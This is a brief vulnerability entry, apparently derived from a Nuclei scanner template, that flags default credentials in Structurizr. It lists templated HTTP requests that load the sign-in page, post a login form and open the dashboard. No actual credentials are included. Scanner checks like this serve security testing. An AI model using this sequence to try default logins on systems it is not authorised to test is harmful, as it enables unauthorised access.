# Vulnerability: Structurizr - Default Login
**Classification:** STRUCTURIZR
**Source:** Nuclei Template (`structurizr-default-login.yaml`)

## Description
Structurizr contains default credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /signin HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&_csrf={{csrf}}&hash=

GET /dashboard HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

